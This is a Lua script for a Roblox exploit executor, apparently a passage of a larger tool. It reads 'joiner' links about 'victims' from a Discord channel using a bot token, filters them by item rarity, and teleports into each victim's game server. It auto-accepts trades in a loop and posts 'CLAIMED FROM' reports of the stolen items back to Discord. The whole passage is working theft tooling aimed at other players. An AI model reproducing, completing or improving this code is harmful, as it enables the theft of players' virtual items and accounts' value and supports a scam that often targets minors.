local function getRequest()
    return syn and syn.request or http_request or request
end

local function parseMessage(text)
    local jid = text:match("plsbrainrot%.me/joiner%?placeId=%d+&gameInstanceId=([%w%-]+)")
    if not jid then
        jid = text:match("TeleportToPlaceInstance.*%(%s*%d+%s*,%s*[\"']([%w%-]+)[\"']")
    end
    if not jid then return nil, nil end

    local rarity = nil
    for name in pairs(ALLOWED_RARITIES) do
        if text:lower():find(name:lower()) then
            rarity = name
            break
        end
    end
    if not rarity and text:lower():find("chroma") then
        rarity = "Chroma"
    end
    return jid, rarity
end

local function getLatestMessages()
    local req = getRequest()
    if not req then return nil end
    local res = req({
        Url = "https://discord.com/api/v10/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {["Authorization"] = "Bot "..token}
    })
    return res and res.StatusCode == 200 and HttpService:JSONDecode(res.Body) or nil
end

local function getinv()
    local ok, res = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer.Name).Weapons.Owned
    end)
    return ok and res or {}
end

local function getItemName(id)
    local ok, d = pcall(function() return require(ReplicatedStorage.Database.Sync).Weapons[id] end)
    return ok and d and d.ItemName or tostring(id)
end

local function sendDiscordEmbed(title, desc, color, fields)
    local req = getRequest()
    if not req then return end
    req({
        Url = "https://discord.com/api/v10/channels/"..channelId.."/messages",
        Method = "POST",
        Headers = {["Authorization"] = "Bot "..token, ["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            embeds={{
                title = title,
                description = desc,
                color = color,
                fields = fields,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    })
end

local function processMsg(msg)
    local texts = {}
    if msg.content and msg.content ~= "" then table.insert(texts, msg.content) end
    if msg.embeds then
        for _, e in ipairs(msg.embeds) do
            if e.title then table.insert(texts, e.title) end
            if e.description then table.insert(texts, e.description) end
        end
    end
    for _, text in ipairs(texts) do
        local jid, rarity = parseMessage(text)
        if jid then
            local author = msg.author and (msg.author.username or msg.author.global_name) or "Unknown"
            if game.JobId == jid then
                victim = author
                targetJobId = jid
                return
            end
            if not rarity or not ALLOWED_RARITIES[rarity] then
                sendDiscordEmbed("SKIPPED", "Low tier detected: "..(rarity or "Unknown")..", not joining", 0xE74C3C, {
                    {name = "Victim", value = author, inline = true}
                })
                return
            end
            victim = author
            targetJobId = jid
            isJoining = true
            sendDiscordEmbed("JOINING", rarity.." detected, joining "..author, 0x3EED50, {
                {name = "Victim", value = author, inline = true},
                {name = "Rarity", value = rarity, inline = true}
            })
            TeleportService:TeleportToPlaceInstance(targetPlaceId, jid, LocalPlayer)
            return
        end
    end
end

local function isVictimInServer()
    if not victim then return false end
    if Players:FindFirstChild(victim) then return true end
    for _, p in ipairs(Players:GetPlayers()) do
        if p.DisplayName == victim then return true end
    end
    return false
end

local function checkClaim()
    if not hasSnapshot or not isVictimInServer() then return end
    local currentInv = getinv()
    local newItems, claimValue = {}, 0
    for id, amt in pairs(currentInv) do
        local oldAmt = oldInv[id] or 0
        if amt > oldAmt then
            local name = getItemName(id)
            claimValue = claimValue + 1
            newItems[name] = amt - oldAmt
        end
    end
    if claimValue > 0 then
        totalValue = totalValue + claimValue
        totalClaims = totalClaims + 1
        local itemText = ""
        for n, a in pairs(newItems) do
            itemText = itemText .. n .. " x" .. a .. "\n"
        end
        sendDiscordEmbed("CLAIMED FROM "..victim, itemText, 0x3EED50, {
            {name = "Total Items", value = tostring(totalClaims), inline = true}
        })
    end
    oldInv = currentInv
end

Trade.UpdateTrade.OnClientEvent:Connect(function(d)
    if d then
        lastOffer = d.LastOffer or lastOffer
        seqId = d.Sequence or seqId
    end
end)

local function doAccept()
    pcall(function()
        Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer or 0, seqId or 0)
    end)
end

local function autoAcceptLoop()
    task.spawn(function()
        while running do
            if autoAccept and hasSnapshot then
                pcall(function()
                    local status = Trade.GetTradeStatus:InvokeServer()
                    if status == "ReceivingRequest" then
                        Trade.AcceptRequest:FireServer()
                    end
                    if status == "StartTrade" or status == "Trading" then
                        doAccept()
                    end
                end)
            end
            task.wait(0.2)
        end
    end)
end

local function formatTime(s)
    local h = math.floor(s / 3600)
    local m = math.floor((s % 3600) / 60)
    local sec = math.floor(s % 60)
    return string.format("%02d:%02d:%02d", h, m, sec)
end

local function scanLoop()
    while running do
        pcall(function()
            local messages = getLatestMessages()
            if messages then
                for _, msg in ipairs(messages) do
                    if not lastMsg or msg.id ~= lastMsg then
                        lastMsg = msg.id
                        processMsg(msg)
                    end
                end
            end
            if hasSnapshot then
                pcall(checkClaim)
            end
        end)
        task.wait(1)
    end
end
